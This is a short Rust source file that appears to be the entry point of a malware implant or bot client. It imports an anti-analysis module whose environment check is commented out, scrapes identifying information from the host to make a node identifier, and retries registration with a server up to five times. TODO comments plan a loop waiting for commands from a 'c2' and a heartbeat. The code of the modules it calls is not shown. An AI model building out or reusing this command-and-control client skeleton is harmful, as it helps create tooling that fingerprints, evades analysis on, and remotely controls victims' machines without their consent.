mod anti_analysis;
mod identity;
mod registration;

use tokio::time::{sleep, Duration};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Ensure proper environment, otherwise die
    // todo: figure out why this exits on my machine.
    // anti_analysis::check_environment();

    // Scrape identifying info from the machine, and prepare a unique identifier for the node instance
    let identity = identity::init();

    let mut registration_attempts = 0u8;
    loop {
        if registration_attempts >= 5 {
            std::process::exit(0);
        }

        let registration_result = registration::run(&identity).await;
        match registration_result {
            Ok(()) => break,
            Err(err) => println!("Registration failed. {}", err.to_string())
        }

        registration_attempts += 1;
        sleep(Duration::from_secs(5)).await;
    }

    // todo: loop waiting for commands from c2
    // todo: heartbeat loop

    Ok(())
}